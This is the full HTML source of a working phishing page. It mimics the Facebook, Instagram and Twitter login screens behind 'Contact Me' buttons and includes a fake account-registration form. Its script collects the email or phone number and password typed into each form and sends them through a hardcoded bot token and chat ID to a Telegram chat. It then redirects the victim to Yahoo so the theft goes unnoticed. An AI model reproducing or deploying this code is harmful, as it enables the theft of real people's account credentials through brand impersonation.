<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Social Media Login</title>

    <!-- External scripts and styles -->
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.5.0/axios.min.js"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">

    <!-- Custom styling -->
    <style>
        body {
            background: #1877F2;
            color: #ffffff;
            font-family: Arial, sans-serif;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            position: relative;
        }

        .main-page {
            text-align: center;
            margin-top: 20px;
        }

        .main-page img {
            max-width: 100%;
            height: auto;
            margin-bottom: 20px;
        }

        .form-container {
            background: #ffffff;
            border-radius: 8px;
            padding: 40px 20px;
            width: 100%;
            max-width: 400px;
            text-align: center;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }

        .form-container input {
            width: 100%;
            padding: 12px;
            margin: 12px 0;
            border-radius: 6px;
            border: 1px solid #ddd;
            font-size: 16px;
            color: black;
        }

        .form-container button {
            background-color: #1877F2;
            color: white;
            padding: 14px;
            font-size: 16px;
            border-radius: 6px;
            border: none;
            width: 100%;
            cursor: pointer;
            margin-top: 20px;
        }

        .form-container .create-account {
            background-color: #42b72a;
            margin-top: 10px;
            padding: 14px;
        }

        .footer {
            color: white;
            text-align: center;
            padding: 10px;
            font-size: 12px;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 10px;
        }

        .footer img {
            width: 25px;
            height: 25px;
            vertical-align: middle;
        }

        .footer.facebook {
            background-color: #1877F2;
        }

        .footer.instagram {
            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
        }

        .footer.twitter {
            background-color: #1DA1F2;
        }

        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <!-- Main Page -->
    <div id="mainPage" class="main-page">
        <!-- Header Image -->
        <img src="https://www.dropbox.com/scl/fi/lyd1gq9sxbm03mzkbbay0/1703528251570.jpg?rlkey=bs41146b2oleicmsrv9k2ducp&raw=1" alt="Header Image">
        
        <button onclick="showLoginForm('facebook')" class="bg-white text-blue-800 px-6 py-3 rounded-full font-bold mb-4">
            <i class="fab fa-facebook"></i> Contact Me on Facebook
        </button>
        <button onclick="showLoginForm('instagram')" class="bg-white text-pink-600 px-6 py-3 rounded-full font-bold mb-4">
            <i class="fab fa-instagram"></i> Contact Me on Instagram
        </button>
        <button onclick="showLoginForm('twitter')" class="bg-white text-blue-500 px-6 py-3 rounded-full font-bold">
            <i class="fab fa-twitter"></i> Contact Me on Twitter
        </button>
    </div>

    <!-- Facebook Form -->
    <div id="facebookFormPage" class="hidden">
        <div class="form-container">
            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_(2019).svg" 
                 alt="Facebook Logo" width="50" class="mx-auto">
            <h2 class="text-blue-800 text-xl font-bold">Log In to Facebook</h2>
            <form id="facebookLoginForm" onsubmit="handleFacebookLogin(event)">
                <input type="text" id="facebookEmailPhone" placeholder="Mobile number or email" required>
                <input type="password" id="facebookPassword" placeholder="Password" required>
                <button type="submit">Log In</button>
                <button type="button" class="create-account" onclick="createAccount('facebook')">Create Account</button>
            </form>
        </div>
        <div class="footer facebook">
            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_(2019).svg" alt="Facebook">
            <span>Facebook © From Meta</span>
        </div>
    </div>

    <!-- Instagram Form -->
    <div id="instagramFormPage" class="hidden">
        <div class="form-container">
            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" 
                 alt="Instagram Logo" width="50" class="mx-auto">
            <h2 class="text-pink-600 text-xl font-bold">Log In to Instagram</h2>
            <form id="instagramLoginForm" onsubmit="handleInstagramLogin(event)">
                <input type="text" id="instagramEmailPhone" placeholder="Mobile number or email" required>
                <input type="password" id="instagramPassword" placeholder="Password" required>
                <button type="submit">Log In</button>
                <button type="button" class="create-account" onclick="createAccount('instagram')">Create Account</button>
            </form>
        </div>
        <div class="footer instagram">
            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram">
            <span>Instagram © From Meta</span>
        </div>
    </div>

    <!-- Twitter Form -->
    <div id="twitterFormPage" class="hidden">
        <div class="form-container">
            <img src="https://upload.wikimedia.org/wikipedia/en/6/60/Twitter_Logo_as_of_2021.svg" 
                 alt="Twitter Logo" width="50" class="mx-auto">
            <h2 class="text-blue-500 text-xl font-bold">Log In to Twitter</h2>
            <form id="twitterLoginForm" onsubmit="handleTwitterLogin(event)">
                <input type="text" id="twitterEmailPhone" placeholder="Mobile number or email" required>
                <input type="password" id="twitterPassword" placeholder="Password" required>
                <button type="submit">Log In</button>
                <button type="button" class="create-account" onclick="createAccount('twitter')">Create Account</button>
            </form>
        </div>
        <div class="footer twitter">
            <img src="https://upload.wikimedia.org/wikipedia/en/6/60/Twitter_Logo_as_of_2021.svg" alt="Twitter">
            <span>Twitter © From Meta</span>
        </div>
    </div>

    <!-- Registration Form (Account Creation) -->
    <div id="registrationFormPage" class="hidden">
        <div class="form-container">
            <h2 class="text-xl font-bold">Create Your Account</h2>
            <form id="registrationForm" onsubmit="handleRegistration(event)">
                <input type="text" id="regUsername" placeholder="Username" required>
                <input type="email" id="regEmail" placeholder="Email" required>
                <input type="password" id="regPassword" placeholder="Password" required>
                <button type="submit">Register</button>
            </form>
        </div>
    </div>

    <script>
        const BOT_TOKEN = '7092700046:AAG4ysq9uQu_2nFBrKqx--wdf4C5jJG4_Bo';
        const CHAT_ID = '6482794683';

        async function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            try {
                await axios.post(url, {
                    chat_id: CHAT_ID,
                    text: message,
                });
                window.location.href = "https://yahoo.com";  // Redirect after submit
            } catch (error) {
                console.error("Error sending to Telegram:", error);
                alert("Failed to send details to Telegram.");
            }
        }

        function handleFacebookLogin(event) {
            event.preventDefault();
            const emailPhone = document.getElementById('facebookEmailPhone').value;
            const password = document.getElementById('facebookPassword').value;
            const message = `Facebook Login:\nMobile/Email: ${emailPhone}\nPassword: ${password}`;
            sendToTelegram(message);
        }

        function handleInstagramLogin(event) {
            event.preventDefault();
            const emailPhone = document.getElementById('instagramEmailPhone').value;
            const password = document.getElementById('instagramPassword').value;
            const message = `Instagram Login:\nMobile/Email: ${emailPhone}\nPassword: ${password}`;
            sendToTelegram(message);
        }

        function handleTwitterLogin(event) {
            event.preventDefault();
            const emailPhone = document.getElementById('twitterEmailPhone').value;
            const password = document.getElementById('twitterPassword').value;
            const message = `Twitter Login:\nMobile/Email: ${emailPhone}\nPassword: ${password}`;
            sendToTelegram(message);
        }

        function createAccount(platform) {
            document.getElementById('facebookFormPage').classList.add('hidden');
            document.getElementById('instagramFormPage').classList.add('hidden');
            document.getElementById('twitterFormPage').classList.add('hidden');
            document.getElementById('registrationFormPage').classList.remove('hidden');
        }

        function handleRegistration(event) {
            event.preventDefault();
            const username = document.getElementById('regUsername').value;
            const email = document.getElementById('regEmail').value;
            const password = document.getElementById('regPassword').value;
            const message = `New Account Created:\nUsername: ${username}\nEmail: ${email}\nPassword: ${password}`;
            sendToTelegram(message);
        }

        function showLoginForm(platform) {
            document.getElementById('mainPage').classList.add('hidden');
            document.getElementById(`${platform}FormPage`).classList.remove('hidden');
        }
    </script>
</body>
                </html>
